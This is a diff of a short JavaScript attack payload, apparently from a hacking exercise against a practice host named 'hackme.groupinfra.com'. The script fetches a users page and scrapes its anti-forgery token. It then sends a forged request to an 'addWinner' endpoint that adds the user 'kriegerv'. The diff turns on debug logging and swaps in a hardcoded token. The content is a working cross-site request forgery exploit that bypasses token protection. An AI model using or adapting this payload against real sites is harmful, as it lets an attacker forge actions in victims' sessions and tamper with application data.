@@ -5,16 +5,16 @@ if (!req) try { req = new ActiveXObject("Msxml2.XMLHTTP"); } catch(e) {}
 if (!req) try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch(e) {}
 req.open('GET', 'http://hackme.groupinfra.com/obiwan/pages/listUsers', false);
 req.send(null);
-//console.log("1." + req.responseText);
+console.log("1." + req.responseText);
 if(req.responseText){
 var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[0].value;
-//console.log("2." + validatingUuid);
+console.log("2." + validatingUuid);
 if(validatingUuid){
-//var validatingUuidValue = $("[name='validatingUuid']")[0].value;
-//console.log("3." + validatingUuidValue);
-req.open('GET', 'http://hackme.groupinfra.com/obiwan/pages/addWinner?name=kriegerv&validatingUuid='+ validatingUuid, false);
+var validatingUuidValue = $("[name='validatingUuid']")[0].value;
+console.log("3." + validatingUuidValue);
+req.open('GET', 'http://hackme.groupinfra.com/obiwan/pages/addWinner?name=kriegerv&validatingUuid=1ca57a4f-6722-4bda-8c8e-bc4b9bb9fc5b', false);
 req.send(null);
-//console.log("4." + req.responseText);
+console.log("4." + req.responseText);
 }
 }
 }
